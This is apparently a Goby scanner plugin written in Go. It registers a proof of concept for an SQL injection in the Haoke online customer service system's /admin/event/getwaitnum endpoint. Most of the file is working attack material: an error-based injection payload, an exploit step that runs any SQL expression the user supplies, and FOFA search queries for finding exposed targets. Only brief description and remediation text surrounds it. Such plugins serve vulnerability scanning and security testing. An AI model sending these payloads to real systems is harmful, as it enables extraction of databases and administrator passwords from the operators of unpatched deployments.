package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Haoke customer service system getwaitnum SQL injection vulnerability",
    "Description": "<p>The hospitality online customer service system is a customer service system built by thinkphp + workerman.</p><p>There is a SQL injection vulnerability in the hospitality online customer service system getwaitnum, which allows attackers to obtain full database information and administrator account passwords.</p>",
    "Product": "Haoke customer service system",
    "Homepage": "https://yuanmayu.cn/?id=58",
    "DisclosureDate": "2022-11-11",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"/platform/passport/resetpassword.html\" || body=\"/dianqilai.ico\" || (body=\"layui-form-item\" && body=\"/admin/login/check.html\")",
    "GobyQuery": "body=\"/platform/passport/resetpassword.html\" || body=\"/dianqilai.ico\" || (body=\"layui-form-item\" && body=\"/admin/login/check.html\")",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the hospitality online customer service system getwaitnum, which allows attackers to obtain full database information and administrator account passwords.</p>",
    "Recommendation": "<p>1. It is forbidden to open the system on the public network. 2. Follow the update in time: <a href=\"https://yuanmayu.cn/?id=58\">https://yuanmayu.cn/?id=58</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/DXG228VhQVSCVVn2aeePOQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin/event/getwaitnum",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "business_id[]=exp&business_id[]=+and+(select 1 from (select count(*),concat((select md5(123)),floor(rand(0)*2))x from information_schema.tables group by x)a)&groupid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b701",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin/event/getwaitnum",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "business_id[]=exp&business_id[]=+and+(select 1 from (select count(*),concat((select {{{cmd}}}),floor(rand(0)*2))x from information_schema.tables group by x)a)&groupid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "好客在线客服系统 getwaitnum SQL 注入漏洞",
            "Product": "好客在线客服系统",
            "Description": "<p>好客在线客服系统是一款thinkphp + workerman搭建的客服系统。<br></p><p>好客在线客服系统 getwaitnum 存在SQL注入漏洞，攻击者可获取数据库全量信息以及管理员账号密码。<br></p>",
            "Recommendation": "<p>1、禁止系统在公网开放。2、及时关注更新：<a href=\"https://yuanmayu.cn/?id=58\">https://yuanmayu.cn/?id=58</a><br></p>",
            "Impact": "<p>好客在线客服系统 getwaitnum 存在SQL注入漏洞，攻击者可获取数据库全量信息以及管理员账号密码。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Haoke customer service system getwaitnum SQL injection vulnerability",
            "Product": "Haoke customer service system",
            "Description": "<p>The hospitality online customer service system is a customer service system built by thinkphp + workerman.<br></p><p>There is a SQL injection vulnerability in the hospitality online customer service system getwaitnum, which allows attackers to obtain full database information and administrator account passwords.<br></p>",
            "Recommendation": "<p>1. It is forbidden to open the system on the public network. 2. Follow the update in time: <a href=\"https://yuanmayu.cn/?id=58\">https://yuanmayu.cn/?id=58</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the hospitality online customer service system getwaitnum, which allows attackers to obtain full database information and administrator account passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
